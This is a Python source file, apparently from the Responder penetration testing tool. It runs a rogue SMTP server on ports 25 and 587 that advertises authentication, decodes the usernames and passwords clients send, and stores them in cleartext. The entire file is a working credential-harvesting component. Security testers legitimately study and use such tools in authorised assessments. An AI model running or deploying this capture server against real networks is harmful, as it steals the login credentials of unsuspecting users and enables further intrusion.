#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import os
import core.responder.settings as settings
import threading

from core.responder.utils import *
from base64 import b64decode, b64encode
from SocketServer import BaseRequestHandler, ThreadingMixIn, TCPServer
from core.responder.packets import SMTPGreeting, SMTPAUTH, SMTPAUTH1, SMTPAUTH2

class SMTP:

	def start(self):
		try:
			if OsInterfaceIsSupported():
				server1 = ThreadingTCPServer((settings.Config.Bind_To, 25), ESMTP)
				server2 = ThreadingTCPServer((settings.Config.Bind_To, 587), ESMTP)
			else:
				server1 = ThreadingTCPServer(('', 25), SMB1)
				server2 = ThreadingTCPServer(('', 587), SMB1)

			for server in [server1, server2]:
				t = threading.Thread(name='SMTP', target=server.serve_forever)
				t.setDaemon(True)
				t.start()
		except Exception as e:
			print "Error starting SMTP server: {}".format(e)
			print_exc()

class ThreadingTCPServer(ThreadingMixIn, TCPServer):
    
    allow_reuse_address = 1

    def server_bind(self):
        if OsInterfaceIsSupported():
            try:
                self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
            except:
                pass
        TCPServer.server_bind(self)

# ESMTP Server class
class ESMTP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(SMTPGreeting()))
			data = self.request.recv(1024)

			if data[0:4] == "EHLO":
				self.request.send(str(SMTPAUTH()))
				data = self.request.recv(1024)

			if data[0:4] == "AUTH":
				self.request.send(str(SMTPAUTH1()))
				data = self.request.recv(1024)
				
				if data:
					try:
						User = filter(None, b64decode(data).split('\x00'))
						Username = User[0]
						Password = User[1]
					except:
						Username = b64decode(data)

						self.request.send(str(SMTPAUTH2()))
						data = self.request.recv(1024)

						if data:
							try: Password = b64decode(data)
							except: Password = data

					SaveToDb({
						'module': 'SMTP', 
						'type': 'Cleartext', 
						'client': self.client_address[0], 
						'user': Username, 
						'cleartext': Password, 
						'fullhash': Username+":"+Password,
					})

		except Exception:
			pass